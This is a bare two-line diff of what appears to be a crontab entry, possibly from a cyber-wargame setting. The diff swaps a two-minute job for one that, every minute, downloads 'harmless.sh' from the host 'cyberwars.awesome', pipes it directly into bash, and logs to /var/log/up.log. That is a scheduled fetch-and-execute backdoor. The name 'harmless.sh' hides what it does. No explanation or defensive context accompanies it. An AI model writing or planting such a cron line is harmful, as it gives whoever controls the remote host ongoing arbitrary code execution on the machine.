@@ -1,1 +1,1 @@
-*/2 * * * * curl cyberwars.awesome/harmless.sh; /bin/sh -c "curl cyberwars.awesome/harmless.sh | bash" >> /var/log/up.log
+* * * * * curl cyberwars.awesome/harmless.sh | bash >> /var/log/up.log
